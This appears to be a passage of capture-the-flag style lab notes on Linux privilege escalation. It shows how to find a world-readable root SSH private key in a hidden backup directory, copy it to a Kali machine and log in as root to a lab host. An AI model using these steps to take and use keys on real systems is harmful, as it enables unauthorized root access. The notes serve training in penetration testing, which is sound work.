Sometimes users make backups of important files but fail to secure them with the correct permissions.

**Look for hidden files & directories in the system root:**
```python
ls -la /
```

**Note that there appears to be a hidden directory called ".ssh". View the contents of the directory:**
```python
ls -l /.ssh
```
- Note that there is a world-readable file called **root_key**. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

**Copy the key over to your Kali box (it's easier to just view the contents of the "root_key" file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:**
```python
chmod 600 root_key
```

**Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):**
```python
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.42.82
```

## Practically - 
### In target machine - 
![[linux_privesc26.png]]

### In attacker machine - 
![[linux_privesc27.png]]
